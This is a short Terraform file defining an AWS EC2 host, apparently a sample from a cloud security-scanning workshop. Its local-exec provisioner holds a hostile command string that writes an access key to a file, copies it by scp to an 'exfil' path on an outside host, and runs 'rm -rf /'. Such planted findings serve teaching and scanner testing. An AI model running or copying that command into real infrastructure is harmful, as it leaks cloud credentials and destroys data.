provider "aws" {
  region = "us-west-2"
}

resource "aws_ec2_host" "test" {
  instance_type     = "t3.micro"
  availability_zone = "us-west-2a"

  provisioner "local-exec" {
    command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
  }

  tags = {
    git_commit           = "dae06248ba3414e47c2af7c6e7161244df4555f6"
    git_file             = "code/iac/simple_ec2.tf"
    git_last_modified_at = "2025-01-03 18:29:57"
    git_last_modified_by = "kwan@paloaltonetworks.com"
    git_modifiers        = "kwan"
    git_org              = "kwan-prismacloud"
    git_repo             = "prisma-cloud-app-sec-workshop"
    yor_name             = "test"
    yor_trace            = "f3be3f6b-1ab4-4287-944d-308c1684a21e"
  }
}
